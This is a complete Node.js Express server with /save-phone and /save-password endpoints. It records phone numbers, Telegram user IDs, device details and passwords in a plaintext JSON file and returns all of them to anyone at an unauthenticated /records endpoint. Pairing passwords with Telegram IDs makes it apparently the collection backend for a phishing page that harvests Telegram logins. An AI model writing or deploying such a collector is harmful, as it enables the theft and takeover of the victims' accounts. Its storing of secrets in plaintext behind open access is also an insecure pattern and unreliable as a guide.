const express = require("express");
const fs = require("fs");
const path = require("path");
const cors = require("cors");
const bodyParser = require("body-parser");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(express.static("public"));

const DB_PATH = path.join(__dirname, "records.json");

if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
}

function loadRecords() {
    return JSON.parse(fs.readFileSync(DB_PATH, "utf8"));
}
function saveRecords(data) {
    fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

app.post("/save-phone", (req, res) => {
    const { phone, tg_id, device } = req.body;
    if (!phone || !tg_id) return res.json({ ok:false, error:"missing fields" });

    const records = loadRecords();
    records.push({ type:"phone", phone, tg_id, device, time:new Date().toISOString() });
    saveRecords(records);
    res.json({ ok:true });
});

app.post("/save-password", (req, res) => {
    const { password, phone, tg_id } = req.body;
    if (!password || !phone || !tg_id) return res.json({ ok:false, error:"missing fields" });

    const records = loadRecords();
    records.push({ type:"password", password, phone, tg_id, time:new Date().toISOString() });
    saveRecords(records);
    res.json({ ok:true });
});

app.get("/records", (req, res) => {
    res.json(loadRecords());
});

app.listen(PORT, () => console.log("Server running on:", PORT));

